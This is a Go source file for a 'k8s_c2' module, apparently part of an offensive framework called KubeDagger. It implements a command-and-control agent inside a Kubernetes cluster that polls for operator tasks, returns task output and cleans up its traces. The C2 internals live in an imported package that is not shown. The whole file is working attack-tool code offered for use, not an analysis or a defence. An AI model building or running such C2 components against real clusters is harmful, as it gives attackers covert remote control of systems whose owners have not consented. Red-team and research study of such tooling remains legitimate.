package modules

import (
	"context"
	"fmt"
	"strings"

	"github.com/yasindce1998/KubeDagger/pkg/k8sc2"
)

type K8sC2 struct{}

func (m *K8sC2) Name() string      { return "k8s_c2" }
func (m *K8sC2) Platform() []string { return []string{"linux", "windows", "darwin"} }

func (m *K8sC2) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "poll"
	}

	agentID := args["agent_id"]
	if agentID == "" {
		agentID = "default"
	}

	switch action {
	case "poll":
		return m.poll(ctx, agentID)
	case "send":
		return m.send(ctx, agentID, args)
	case "cleanup":
		return m.cleanup(ctx, agentID)
	default:
		return nil, fmt.Errorf("unknown action: %s (valid: poll, send, cleanup)", action)
	}
}

func (m *K8sC2) poll(ctx context.Context, agentID string) (*Result, error) {
	ctrl, err := k8sc2.NewController(agentID)
	if err != nil {
		return &Result{
			Success: false,
			Output:  fmt.Sprintf("controller init failed (not in cluster?): %v", err),
		}, nil
	}

	tasks, err := ctrl.PollTasking(ctx)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("poll failed: %v", err),
		}, nil
	}

	if len(tasks) == 0 {
		return &Result{
			Success: true,
			Output:  "no pending tasks",
		}, nil
	}

	var summary []string
	summary = append(summary, fmt.Sprintf("pending_tasks: %d", len(tasks)))
	for _, t := range tasks {
		summary = append(summary, fmt.Sprintf("  task[%s]: %s", t.ID, t.Command))
	}

	return &Result{
		Success: true,
		Output:  strings.Join(summary, "\n"),
	}, nil
}

func (m *K8sC2) send(ctx context.Context, agentID string, args map[string]string) (*Result, error) {
	taskID := args["task_id"]
	output := args["output"]
	if taskID == "" || output == "" {
		return nil, fmt.Errorf("send requires task_id and output args")
	}

	ctrl, err := k8sc2.NewController(agentID)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("controller init failed: %v", err),
		}, nil
	}

	if err := ctrl.SendResult(ctx, taskID, output); err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("send result failed: %v", err),
		}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("result sent for task %s", taskID),
	}, nil
}

func (m *K8sC2) cleanup(ctx context.Context, agentID string) (*Result, error) {
	ctrl, err := k8sc2.NewController(agentID)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("controller init failed: %v", err),
		}, nil
	}

	if err := ctrl.Cleanup(ctx, 0); err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("cleanup failed: %v", err),
		}, nil
	}

	return &Result{
		Success: true,
		Output:  "cleanup completed",
	}, nil
}
